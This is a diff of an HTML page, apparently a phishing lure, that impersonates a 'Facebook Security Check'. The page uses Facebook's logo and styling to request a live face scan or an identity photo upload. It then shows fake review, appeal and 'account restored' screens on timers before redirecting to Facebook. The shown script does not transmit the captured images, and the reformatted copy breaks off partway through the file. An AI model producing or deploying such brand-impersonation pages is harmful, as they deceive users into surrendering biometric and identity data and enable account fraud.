@@ -1,1 +1,741 @@
-<!DOCTYPE html> <html lang="en"> <head>     <meta charset="UTF-8">     <meta name="viewport" content="width=device-width, initial-scale=1.0">     <title>Facebook Security Check</title>     <style>         * {             box-sizing: border-box;             margin: 0;             padding: 0;             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;         }         body {             background-color: #f0f2f5;             color: #1c1e21;             display: flex;             justify-content: center;             align-items: center;             min-height: 100vh;         }         .container {             width: 100%;             max-width: 480px;             background: #ffffff;             min-height: 100vh;             display: flex;             flex-direction: column;             justify-content: space-between;             padding: 20px;             box-shadow: 0 4px 12px rgba(0,0,0,0.1);         }         .header-logo {             text-align: left;             margin-bottom: 20px;         }         .header-logo svg {             width: 40px;             height: 40px;             fill: #1877f2;         }         h1 {             font-size: 24px;             font-weight: 700;             margin-bottom: 20px;             color: #050505;         }         .profile-card {             border: 1px solid #ccd0d5;             border-radius: 8px;             padding: 12px 16px;             display: flex;             align-items: center;             margin-bottom: 20px;             background: #fff;         }         .profile-pic {             width: 40px;             height: 40px;             border-radius: 50%;             background-color: #e4e6eb;             display: flex;             align-items: center;             justify-content: center;             margin-right: 12px;         }         .profile-pic svg {             width: 24px;             height: 24px;             fill: #1877f2;         }         .profile-info .name {             font-weight: 700;             font-size: 16px;             color: #050505;         }         .profile-info .platform {             font-size: 13px;             color: #65676b;         }         .option-box {             border: 1px solid #ccd0d5;             border-radius: 8px;             padding: 16px;             margin-bottom: 12px;             display: flex;             align-items: center;             justify-content: space-between;             cursor: pointer;             transition: background 0.2s;         }         .option-box.selected {             border-color: #1877f2;             background-color: #e7f3ff;         }         .option-left {             display: flex;             align-items: center;         }         .option-icon {             font-size: 24px;             margin-right: 15px;         }         .option-details .title {             font-weight: 600;             font-size: 15px;             color: #050505;         }         .option-details .desc {             font-size: 13px;             color: #65676b;             margin-top: 2px;         }         .radio-btn {             width: 20px;             height: 20px;             border: 2px solid #65676b;             border-radius: 50%;             display: flex;             align-items: center;             justify-content: center;         }         .option-box.selected .radio-btn::after {             content: '';             width: 10px;             height: 10px;             background: #1877f2;             border-radius: 50%;         }         .btn-primary {             width: 100%;             background-color: #1877f2;             color: white;             border: none;             border-radius: 6px;             padding: 14px;             font-size: 16px;             font-weight: 600;             cursor: pointer;             text-align: center;             margin-top: 20px;         }         .btn-primary:disabled {             background-color: #e4e6eb;             color: #bcc0c4;             cursor: not-allowed;         }                  /* Screen views */         .screen {             display: none;             flex-direction: column;             justify-content: space-between;             height: 100%;         }         .screen.active {             display: flex;         }          /* Camera Screen Styling */         .camera-container {             position: relative;             width: 100%;             height: 350px;             background: #000;             border-radius: 50% / 40%;             overflow: hidden;             margin: 20px 0;             display: flex;             justify-content: center;             align-items: center;         }         video, canvas {             width: 100%;             height: 100%;             object-fit: cover;         }         .arrow-up {             background: #1877f2;             color: white;             width: 40px;             height: 40px;             border-radius: 50%;             display: flex;             align-items: center;             justify-content: center;             font-size: 20px;             margin: 0 auto 15px auto;             transition: transform 0.3s;         }         .instruction-text {             text-align: center;             font-size: 18px;             font-weight: bold;             margin-top: 10px;         }          /* Loading Spinner */         .loading-screen {             display: flex;             flex-direction: column;             align-items: center;             justify-content: center;             height: 80vh;             text-align: center;         }         .spinner {             border: 4px solid #f3f3f3;             border-top: 4px solid #1877f2;             border-radius: 50%;             width: 50px;             height: 50px;             animation: spin 1s linear infinite;             margin-bottom: 20px;         }         @keyframes spin {             0% { transform: rotate(0deg); }             100% { transform: rotate(360deg); }         }          /* Passport Screen Light Mode UI */         .fb-header-bar {             display: flex;             justify-content: space-between;             align-items: center;             margin-bottom: 12px;         }         .fb-brand-logo {             font-size: 28px;             font-weight: 800;             color: #1877f2;             letter-spacing: -1px;         }         .progress-bar-container {             width: 100%;             height: 4px;             background-color: #e4e6eb;             border-radius: 2px;             margin-bottom: 24px;             overflow: hidden;         }         .progress-bar-fill {             width: 65%;             height: 100%;             background-color: #1877f2;         }         .passport-title {             font-size: 22px;             font-weight: 700;             color: #050505;             margin-bottom: 12px;         }         .passport-desc {             font-size: 15px;             color: #1c1e21;             line-height: 1.4;             margin-bottom: 24px;         }         .upload-btn-custom {             width: 100%;             background-color: #e4e6eb;             color: #050505;             border: none;             border-radius: 6px;             padding: 12px;             font-size: 15px;             font-weight: 600;             display: flex;             align-items: center;             justify-content: center;             gap: 8px;             cursor: pointer;             margin-bottom: 20px;         }         .upload-btn-custom svg {             width: 18px;             height: 18px;             fill: #050505;         }         .info-box {             background-color: #f7f8fa;             border-radius: 8px;             padding: 14px 16px;             font-size: 13px;             color: #65676b;             line-height: 1.45;             margin-bottom: 20px;         }         .file-status {             font-size: 13px;             color: #2e7d32;             margin-bottom: 15px;             font-weight: 600;             display: none;         }          /* Appeal Screen Dark Theme UI */         .appeal-container-dark {             background-color: #1c1e21;             color: #e4e6eb;             min-height: 100vh;             padding: 20px;             margin: -20px;             display: flex;             flex-direction: column;             justify-content: space-between;         }         .appeal-header {             display: flex;             justify-content: space-between;             align-items: center;             margin-bottom: 25px;         }         .appeal-brand {             font-size: 26px;             font-weight: 800;             color: #ffffff;             letter-spacing: -0.5px;         }         .appeal-help-btn {             color: #ffffff;             text-decoration: none;             font-size: 16px;             font-weight: 500;         }         .warning-badge {             width: 48px;             height: 48px;             background-color: #262626;             border-radius: 50%;             display: flex;             align-items: center;             justify-content: center;             margin: 10px auto 20px auto;         }         .warning-badge-icon {             color: #f3c11b;             font-size: 24px;         }         .appeal-main-title {             font-size: 22px;             font-weight: 700;             color: #ffffff;             text-align: center;             margin-bottom: 8px;             line-height: 1.3;         }         .appeal-date {             text-align: center;             font-size: 12px;             font-weight: 700;             color: #b0b3b8;             letter-spacing: 0.5px;             margin-bottom: 16px;             text-transform: uppercase;         }         .appeal-subtitle {             font-size: 18px;             font-weight: 700;             color: #ffffff;             text-align: center;             margin-bottom: 8px;         }         .appeal-notice {             font-size: 14px;             color: #b0b3b8;             text-align: center;             line-height: 1.4;             margin-bottom: 25px;             padding: 0 10px;         }         .appeal-divider {             border: none;             border-top: 1px solid #3e4042;             margin-bottom: 25px;         }         .appeal-section-title {             font-size: 18px;             font-weight: 700;             color: #ffffff;             margin-bottom: 16px;         }         .appeal-bullet-list {             list-style: none;             padding-left: 0;             margin-bottom: 25px;         }         .appeal-bullet-list li {             position: relative;             padding-left: 20px;             font-size: 14px;             color: #e4e6eb;             line-height: 1.5;             margin-bottom: 18px;         }         .appeal-bullet-list li::before {             content: "•";             position: absolute;             left: 0;             top: 0;             color: #e4e6eb;             font-size: 16px;         }         .btn-close-dark {             width: 100%;             background-color: #1877f2;             color: #ffffff;             border: none;             border-radius: 8px;             padding: 12px;             font-size: 16px;             font-weight: 600;             cursor: pointer;             text-align: center;         }         .restore-success-card {             text-align: center;             padding: 40px 15px;         }         .restore-success-title {             font-size: 28px;             font-weight: 800;             color: #2e7d32;             margin-bottom: 15px;             line-height: 1.3;         }     </style> </head> <body>  <div class="container">          <!-- SCREEN 1: Choose Option -->     <div id="screen-1" class="screen active">         <div>             <div class="header-logo">                 <svg viewBox="0 0 36 36"><path fill="#1877f2" d="M20.18 35.5V20.2h5.13l.77-5.96h-5.9v-3.8c0-1.73.48-2.91 2.96-2.91h3.16V2.05c-.55-.07-2.43-.24-4.62-.24-4.58 0-7.72 2.8-7.72 7.95v4.4h-5.19v5.96h5.19v15.38h6.14z"></path></svg>             </div>             <h1>Choose a way to confirm it's you</h1>                          <div class="profile-card">                 <div class="profile-pic">                     <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg>                 </div>                 <div class="profile-info">                     <div class="name user-id-dynamic">User ID: Loading...</div>                     <div class="platform">Facebook</div>                 </div>             </div>              <!-- Option 1: Video Selfie -->             <div class="option-box selected" onclick="selectOption('video', this)">                 <div class="option-left">                     <div class="option-icon">📷</div>                     <div class="option-details">                         <div class="title">Video selfie</div>                         <div class="desc">Take a video selfie in a well-lit area</div>                     </div>                 </div>                 <div class="radio-btn"></div>             </div>              <!-- Option 2: Passport -->             <div class="option-box" onclick="selectOption('passport', this)">                 <div class="option-left">                     <div class="option-icon">💳</div>                     <div class="option-details">                         <div class="title">Passport</div>                         <div class="desc">Tap your passport with your phone to scan</div>                     </div>                 </div>                 <div class="radio-btn"></div>             </div>         </div>          <button class="btn-primary" id="continueBtn" onclick="proceedNext()">Continue</button>     </div>      <!-- SCREEN 2: Loading -->     <div id="screen-loading" class="screen">         <div class="loading-screen">             <div class="spinner"></div>             <h3 id="loadingText">Loading verification process...</h3>         </div>     </div>      <!-- SCREEN 3: Camera Live View & Auto Scan -->     <div id="screen-camera" class="screen">         <div>             <div class="arrow-up" id="arrowIcon">↑</div>             <div class="camera-container">                 <video id="videoElement" autoplay playsinline></video>                 <canvas id="photoCanvas" style="display:none;"></canvas>             </div>             <div class="instruction-text" id="cameraInstruction">Position your face in the frame</div>         </div>         <button class="btn-primary" onclick="uploadSelfie()" id="uploadBtn" style="display:none;">Upload</button>     </div>      <!-- SCREEN 4: Reviewing Selfie -->     <div id="screen-review" class="screen">         <div class="loading-screen">             <div class="spinner"></div>             <h2>We Are Reviewing Your Selfie</h2>             <p style="color: #65676b; margin-top: 10px;">This may take a few moments. Please do not close this window.</p>         </div>     </div>      <!-- SCREEN 5: Verification Complete -->     <div id="screen-captcha" class="screen">         <div style="padding-top: 40px; text-align: center;">             <h2>Security Verification Complete</h2>             <p style="margin: 20px 0; color: #65676b;">Your request has been received. Please click continue to proceed.</p>             <button class="btn-primary" onclick="redirectToFacebook()">Continue to Facebook</button>         </div>     </div>      <!-- SCREEN 6: Passport Upload Screen -->     <div id="screen-passport" class="screen">         <div>             <div class="fb-header-bar">                 <div class="fb-brand-logo">facebook</div>             </div>             <div class="progress-bar-container">                 <div class="progress-bar-fill"></div>             </div>              <h1 class="passport-title">Upload a verification selfie</h1>             <p class="passport-desc">                 Upload a photo that clearly shows your face. Make sure the photo is well-lit and isn't blurry. Don't include other people in the shot.             </p>              <input type="file" id="passportFile" accept="image/*" style="display:none;" onchange="handleFileSelected()">              <button class="upload-btn-custom" onclick="document.getElementById('passportFile').click()">                 <svg viewBox="0 0 24 24">                     <path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm0 16H5V5h14v14zm-5-7l-3 3.72L9 13l-3 4h12l-4-5z"/>                 </svg>                 Upload image or take photo             </button>              <div class="file-status" id="fileStatusText">✓ Photo selected</div>              <div class="info-box">                 We'll store an encrypted copy of your selfie for up to 1 year to improve our ability to detect fake photos, keeping Facebook safe from impersonation. <a href="#">Change how long we store your selfie for</a> or <a href="#">Learn more</a>             </div>         </div>          <button class="btn-primary" id="passportSubmitBtn" disabled onclick="submitPassport()">Submit</button>     </div>      <!-- SCREEN 7: Appeal Submitted Dark Mode UI -->     <div id="screen-appeal-submitted" class="screen">         <div class="appeal-container-dark">             <div>                 <div class="appeal-header">                     <div class="appeal-brand">facebook</div>                     <a href="https://www.facebook.com/help" target="_blank" class="appeal-help-btn">Help</a>                 </div>                  <div class="warning-badge">                     <span class="warning-badge-icon">⚠️</span>                 </div>                  <h2 class="appeal-main-title"><span class="user-id-dynamic">User ID: ...</span>, you submitted an appeal</h2>                 <div class="appeal-date" id="appealSubmittedDate">ON OCTOBER 23, 2026</div>                  <div class="appeal-subtitle">Check back here for the result.</div>                 <p class="appeal-notice">                     Your account is not visible to people on Facebook, and you can't use it.                 </p>                  <hr class="appeal-divider">                  <div class="appeal-section-title">What happens next?</div>                 <ul class="appeal-bullet-list">                     <li>It usually takes us just over a day to review your information.</li>                     <li>If we find your account does follow our Community Standards, you'll be able to use Facebook again.</li>                     <li>If we find your account doesn't follow our Community Standards, it will be permanently disabled and you won't be able to appeal again.</li>                 </ul>             </div>              <button class="btn-close-dark" onclick="redirectToFacebook()">Close</button>         </div>     </div>      <!-- SCREEN 8: 1 Min 23 Sec Review Finish Screen -->     <div id="screen-restore-success" class="screen">         <div class="restore-success-card">             <div style="font-size: 60px; margin-bottom: 20px;">✅</div>             <h1 class="restore-success-title">Your account restore Successfully</h1>             <p style="color: #65676b; margin-bottom: 30px;">Thank you for confirming your details. You can now use your Facebook account normally.</p>             <button class="btn-primary" onclick="redirectToFacebook()">Go to Facebook</button>         </div>     </div>  </div>  <script>     let selectedType = 'video';     let mediaStream = null;     let scanInterval = null;     let currentRandomNum = "";      // Automatic Random User ID Generator     function updateRandomUserId() {         currentRandomNum = Math.floor(100000 + Math.random() * 900000);         const elements = document.querySelectorAll('.user-id-dynamic');         elements.forEach(el => {             el.innerText = "User ID: " + currentRandomNum;         });     }     setInterval(updateRandomUserId, 30 * 60 * 1000);     updateRandomUserId();      function selectOption(type, element) {         selectedType = type;         const boxes = document.querySelectorAll('.option-box');         boxes.forEach(box => box.classList.remove('selected'));         element.classList.add('selected');     }      function showScreen(screenId) {         document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));         document.getElementById(screenId).classList.add('active');     }      function proceedNext() {         if (selectedType === 'video') {             document.getElementById('loadingText').innerText = "Loading verification process...";             showScreen('screen-loading');             setTimeout(() => {                 showScreen('screen-camera');                 startCamera();             }, 2000);         } else {             showScreen('screen-passport');         }     }      // Camera and 15-Second Face Scan Handling     function startCamera() {         const video = document.getElementById('videoElement');         const canvas = document.getElementById('photoCanvas');         const instruction = document.getElementById('cameraInstruction');         const uploadBtn = document.getElementById('uploadBtn');          video.style.display = 'block';         canvas.style.display = 'none';         uploadBtn.style.display = 'none';          navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })             .then(stream => {                 mediaStream = stream;                 video.srcObject = stream;                  let timeLeft = 15;                 instruction.innerText = `Hold still while scanning... (${timeLeft}s)`;                  scanInterval = setInterval(() => {                     timeLeft--;                     if (timeLeft > 0) {                         instruction.innerText = `Hold still while scanning... (${timeLeft}s)`;                         document.getElementById('arrowIcon').style.transform = `rotate(${ (15 - timeLeft) * 24 }deg)`;                     } else {                         clearInterval(scanInterval);                          canvas.width = video.videoWidth || 320;                         canvas.height = video.videoHeight || 240;                         const context = canvas.getContext('2d');                         context.drawImage(video, 0, 0, canvas.width, canvas.height);                          video.style.display = 'none';                         canvas.style.display = 'block';                          if (mediaStream) {                             mediaStream.getTracks().forEach(track => track.stop());                         }                          instruction.innerText = "Face Scan Complete!";                         uploadBtn.style.display = 'block';                     }                 }, 1000);             })             .catch(err => {                 console.log("Camera access denied or unavailable: ", err);                 instruction.innerText = "Camera Access Denied";             });     }      // Selfie Upload     function uploadSelfie() {         showScreen('screen-review');         setTimeout(() => {             showScreen('screen-captcha');         }, 31000);     }      // File Selection     function handleFileSelected() {         const fileInput = document.getElementById('passportFile');         const submitBtn = document.getElementById('passportSubmitBtn');         const fileStatus = document.getElementById('fileStatusText');          if (fileInput.files && fileInput.files[0]) {             fileStatus.style.display = 'block';             fileStatus.innerText = "✓ Photo selected: " + fileInput.files[0].name;             submitBtn.disabled = false;         }     }      // Passport Submit with BD Auto Date, 10s Loading & 1 Minute 23 Seconds Timer     function submitPassport() {         document.getElementById('loadingText').innerText = "Uploading your document...";         showScreen('screen-loading');          setTimeout(() => {             // Generate Auto Bangladesh Date             const now = new Date();             const options = { month: 'long', day: 'numeric', year: 'numeric' };             const bdDateFormatted = now.toLocaleDateString('en-US', options).toUpperCase();             document.getElementById('appealSubmittedDate').innerText = "ON " + bdDateFormatted;              // Show Appeal Screen             showScreen('screen-appeal-submitted');              // 1 Minute 23 Seconds Timer = (60 + 23) * 1000 = 83000 ms             setTimeout(() => {                 showScreen('screen-restore-success');             }, 83000);          }, 10000);     }      function redirectToFacebook() {         window.location.href = "https://m.facebook.com";     } </script>  </body> </html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Security Check</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+        body {
+            background-color: #f0f2f5;
+            color: #1c1e21;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .container {
+            width: 100%;
+            max-width: 480px;
+            background: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            padding: 20px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+        }
+        .header-logo {
+            text-align: left;
+            margin-bottom: 20px;
+        }
+        .header-logo svg {
+            width: 40px;
+            height: 40px;
+            fill: #1877f2;
+        }
+        h1 {
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 20px;
+            color: #050505;
+        }
+        .profile-card {
+            border: 1px solid #ccd0d5;
+            border-radius: 8px;
+            padding: 12px 16px;
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+            background: #fff;
+        }
+        .profile-pic {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background-color: #e4e6eb;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 12px;
+        }
+        .profile-pic svg {
+            width: 24px;
+            height: 24px;
+            fill: #1877f2;
+        }
+        .profile-info .name {
+            font-weight: 700;
+            font-size: 16px;
+            color: #050505;
+        }
+        .profile-info .platform {
+            font-size: 13px;
+            color: #65676b;
+        }
+        .option-box {
+            border: 1px solid #ccd0d5;
+            border-radius: 8px;
+            padding: 16px;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        .option-box.selected {
+            border-color: #1877f2;
+            background-color: #e7f3ff;
+        }
+        .option-left {
+            display: flex;
+            align-items: center;
+        }
+        .option-icon {
+            font-size: 24px;
+            margin-right: 15px;
+        }
+        .option-details .title {
+            font-weight: 600;
+            font-size: 15px;
+            color: #050505;
+        }
+        .option-details .desc {
+            font-size: 13px;
+            color: #65676b;
+            margin-top: 2px;
+        }
+        .radio-btn {
+            width: 20px;
+            height: 20px;
+            border: 2px solid #65676b;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .option-box.selected .radio-btn::after {
+            content: '';
+            width: 10px;
+            height: 10px;
+            background: #1877f2;
+            border-radius: 50%;
+        }
+        .btn-primary {
+            width: 100%;
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            padding: 14px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            text-align: center;
+            margin-top: 20px;
+        }
+        .btn-primary:disabled {
+            background-color: #e4e6eb;
+            color: #bcc0c4;
+            cursor: not-allowed;
+        }
+        
+        /* Screen views */
+        .screen {
+            display: none;
+            flex-direction: column;
+            justify-content: space-between;
+            height: 100%;
+        }
+        .screen.active {
+            display: flex;
+        }
+
+        /* Camera Screen Styling */
+        .camera-container {
+            position: relative;
+            width: 100%;
+            height: 350px;
+            background: #000;
+            border-radius: 50% / 40%;
+            overflow: hidden;
+            margin: 20px 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        video, canvas {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        .arrow-up {
+            background: #1877f2;
+            color: white;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+            margin: 0 auto 15px auto;
+            transition: transform 0.3s;
+        }
+        .instruction-text {
+            text-align: center;
+            font-size: 18px;
+            font-weight: bold;
+            margin-top: 10px;
+        }
+
+        /* Loading Spinner */
+        .loading-screen {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 80vh;
+            text-align: center;
+        }
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #1877f2;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Passport Screen Light Mode UI */
+        .fb-header-bar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 12px;
+        }
+        .fb-brand-logo {
+            font-size: 28px;
+            font-weight: 800;
+            color: #1877f2;
+            letter-spacing: -1px;
+        }
+        .progress-bar-container {
+            width: 100%;
+            height: 4px;
+            background-color: #e4e6eb;
+            border-radius: 2px;
+            margin-bottom: 24px;
+            overflow: hidden;
+        }
+        .progress-bar-fill {
+            width: 65%;
+            height: 100%;
+            background-color: #1877f2;
+        }
+        .passport-title {
+            font-size: 22px;
+            font-weight: 700;
+            color: #050505;
+            margin-bottom: 12px;
+        }
+        .passport-desc {
+            font-size: 15px;
+            color: #1c1e21;
+            line-height: 1.4;
+            margin-bottom: 24px;
+        }
+        .upload-btn-custom {
+            width: 100%;
+            background-color: #e4e6eb;
+            color: #050505;
+            border: none;
+            border-radius: 6px;
+            padding: 12px;
+            font-size: 15px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            cursor: pointer;
+            margin-bottom: 20px;
+        }
+        .upload-btn-custom svg {
+            width: 18px;
+            height: 18px;
+            fill: #050505;
+        }
+        .info-box {
+            background-color: #f7f8fa;
+            border-radius: 8px;
+            padding: 14px 16px;
+            font-size: 13px;
+            color: #65676b;
+            line-height: 1.45;
+            margin-bottom: 20px;
+        }
+        .file-status {
+            font-size: 13px;
+            color: #2e7d32;
+            margin-bottom: 15px;
+            font-weight: 600;
+            display: none;
+        }
+
+        /* Appeal Screen Dark Theme UI */
+        .appeal-container-dark {
+            background-color: #1c1e21;
+            color: #e4e6eb;
+            min-height: 100vh;
+            padding: 20px;
+            margin: -20px;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+        }
+        .appeal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 25px;
+        }
+        .appeal-brand {
+            font-size: 26px;
+            font-weight: 800;
+            color: #ffffff;
+            letter-spacing: -0.5px;
+        }
+        .appeal-help-btn {
+            color: #ffffff;
+            text-decoration: none;
+            font-size: 16px;
+            font-weight: 500;
+        }
+        .warning-badge {
+            width: 48px;
+            height: 48px;
+            background-color: #262626;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 10px auto 20px auto;
+        }
+        .warning-badge-icon {
+            color: #f3c11b;
+            font-size: 24px;
+        }
+        .appeal-main-title {
+            font-size: 22px;
+            font-weight: 700;
+            color: #ffffff;
+            text-align: center;
+            margin-bottom: 8px;
+            line-height: 1.3;
+        }
+        .appeal-date {
+            text-align: center;
+            font-size: 12px;
+            font-weight: 700;
+            color: #b0b3b8;
+            letter-spacing: 0.5px;
+            margin-bottom: 16px;
+            text-transform: uppercase;
+        }
+        .appeal-subtitle {
+            font-size: 18px;
+            font-weight: 700;
+            color: #ffffff;
+            text-align: center;
+            margin-bottom: 8px;
+        }
+        .appeal-notice {
+            font-size: 14px;
+            color: #b0b3b8;
+            text-align: center;
+            line-height: 1.4;
+            margin-bottom: 25px;
+            padding: 0 10px;
+        }
+        .appeal-divider {
+            border: none;
+            border-top: 1px solid #3e4042;
+            margin-bottom: 25px;
+        }
+        .appeal-section-title {
+            font-size: 18px;
+            font-weight: 700;
+            color: #ffffff;
+            margin-bottom: 16px;
+        }
+        .appeal-bullet-list {
+            list-style: none;
+            padding-left: 0;
+            margin-bottom: 25px;
+        }
+        .appeal-bullet-list li {
+            position: relative;
+            padding-left: 20px;
+            font-size: 14px;
+            color: #e4e6eb;
+            line-height: 1.5;
+            margin-bottom: 18px;
+        }
+        .appeal-bullet-list li::before {
+            content: "•";
+            position: absolute;
+            left: 0;
+            top: 0;
+            color: #e4e6eb;
+            font-size: 16px;
+        }
+        .btn-close-dark {
+            width: 100%;
+            background-color: #1877f2;
+            color: #ffffff;
+            border: none;
+            border-radius: 8px;
+            padding: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            text-align: center;
+        }
+        .restore-success-card {
+            text-align: center;
+            padding: 40px 15px;
+        }
+        .restore-success-title {
+            font-size: 28px;
+            font-weight: 800;
+            color: #2e7d32;
+            margin-bottom: 15px;
+            line-height: 1.3;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    
+    <!-- SCREEN 1: Choose Option -->
+    <div id="screen-1" class="screen active">
+        <div>
+            <div class="header-logo">
+                <svg viewBox="0 0 36 36"><path fill="#1877f2" d="M20.18 35.5V20.2h5.13l.77-5.96h-5.9v-3.8c0-1.73.48-2.91 2.96-2.91h3.16V2.05c-.55-.07-2.43-.24-4.62-.24-4.58 0-7.72 2.8-7.72 7.95v4.4h-5.19v5.96h5.19v15.38h6.14z"></path></svg>
+            </div>
+            <h1>Choose a way to confirm it's you</h1>
+            
+            <div class="profile-card">
+                <div class="profile-pic">
+                    <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg>
+                </div>
+                <div class="profile-info">
+                    <div class="name user-id-dynamic">User ID: Loading...</div>
+                    <div class="platform">Facebook</div>
+                </div>
+            </div>
+
+            <!-- Option 1: Video Selfie -->
+            <div class="option-box selected" onclick="selectOption('video', this)">
+                <div class="option-left">
+                    <div class="option-icon">📷</div>
+                    <div class="option-details">
+                        <div class="title">Video selfie</div>
+                        <div class="desc">Take a video selfie in a well-lit area</div>
+                    </div>
+                </div>
+                <div class="radio-btn"></div>
+            </div>
+
+            <!-- Option 2: Passport -->
+            <div class="option-box" onclick="selectOption('passport', this)">
+                <div class="option-left">
+                    <div class="option-icon">💳</div>
+                    <div class="option-details">
+                        <div class="title">Passport</div>
+                        <div class="desc">Tap your passport with your phone to scan</div>
+                    </div>
+                </div>
+                <div class="radio-btn"></div>
+            </div>
+        </div>
+
+        <button class="btn-primary" id="continueBtn" onclick="proceedNext()">Continue</button>
+    </div>
+
+    <!-- SCREEN 2: Loading -->
+    <div id="screen-loading" class="screen">
+        <div class="loading-screen">
+            <div class="spinner"></div>
+            <h3 id="loadingText">Loading verification process...</h3>
+        </div>
+    </div>
+
+    <!-- SCREEN 3: Camera Live View & Auto Scan -->
+    <div id="screen-camera" class="screen">
+        <div>
+            <div class="arrow-up" id="arrowIcon">↑</div>
+            <div class="camera-container">
+                <video id="videoElement" autoplay playsinline></video>
+                <canvas id="photoCanvas" style="display:none;"></canvas>
+            </div>
+            <div class="instruction-text" id="cameraInstruction">Position your face in the frame</div>
+        </div>
+        <button class="btn-primary" onclick="uploadSelfie()" id="uploadBtn" style="display:none;">Upload</button>
+    </div>
+
+    <!-- SCREEN 4: Reviewing Selfie -->
+    <div id="screen-review" class="screen">
+        <div class="loading-screen">
+            <div class="spinner"></div>
+            <h2>We Are Reviewing Your Selfie</h2>
+            <p style="color: #65676b; margin-top: 10px;">This may take a few moments. Please do not close this window.</p>
+        </div>
+    </div>
+
+    <!-- SCREEN 5: Verification Complete -->
+    <div id="screen-captcha" class="screen">
+        <div style="padding-top: 40px; text-align: center;">
+            <h2>Security Verification Complete</h2>
+            <p style="margin: 20px 0; color: #65676b;">Your request has been received. Please click continue to proceed.</p>
+            <button class="btn-primary" onclick="redirectToFacebook()">Continue to Facebook</button>
+        </div>
+    </div>
+
+    <!-- SCREEN 6: Passport Upload Screen -->
+    <div id="screen-passport" class="screen">
+        <div>
+            <div class="fb-header-bar">
+                <div class="fb-brand-logo">facebook</div>
+            </div>
+            <div class="progress-bar-container">
+                <div class="progress-bar-fill"></div>
+            </div>
+
+            <h1 class="passport-title">Upload a verification selfie</h1>
+            <p class="passport-desc">
+                Upload a photo that clearly shows your face. Make sure the photo is well-lit and isn't blurry. Don't include other people in the shot.
+            </p>
+
+            <input type="file" id="passportFile" accept="image/*" style="display:none;" onchange="handleFileSelected()">
+
+            <button class="upload-btn-custom" onclick="document.getElementById('passportFile').click()">
+                <svg viewBox="0 0 24 24">
+                    <path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm0 16H5V5h14v14zm-5-7l-3 3.72L9 13l-3 4h12l-4-5z"/>
+                </svg>
+                Upload image or take photo
+            </button>
+
+            <div class="file-status" id="fileStatusText">✓ Photo selected</div>
+
+            <div class="info-box">
+                We'll store an encrypted copy of your selfie for up to 1 year to improve our ability to detect fake photos, keeping Facebook safe from impersonation. <a href="#">Change how long we store your selfie for</a> or <a href="#">Learn more</a>
+            </div>
+        </div>
+
+        <button class="btn-primary" id="passportSubmitBtn" disabled onclick="submitPassport()">Submit</button>
+    </div>
+
+    <!-- SCREEN 7: Appeal Submitted Dark Mode UI -->
+    <div id="screen-appeal-submitted" class="screen">
+        <div class="appeal-container-dark">
+            <div>
+                <div class="appeal-header">
+                    <div class="appeal-brand">facebook</div>
+                    <a href="https://www.facebook.com/help" target="_blank" class="appeal-help-btn">Help</a>
+                </div>
+
